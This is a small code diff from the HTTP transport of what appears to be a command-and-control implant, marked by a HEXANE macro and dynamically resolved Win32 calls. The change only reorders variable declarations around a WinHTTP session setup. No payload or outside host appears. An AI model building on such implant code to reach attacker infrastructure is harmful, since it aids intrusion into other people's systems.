@@ -70,10 +70,8 @@ namespace Http {
         HEXANE
 
         _request_context *req_ctx = R_CAST(_request_context*, x_malloc(sizeof(_request_context)));
-
-        uint32_t length     = 0;
-        uint32_t n_endpoint = 0;
         wchar_t *endpoint   = { };
+        uint32_t n_endpoint = 0;
 
         if (!Ctx->transport.http->handle) {
             if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
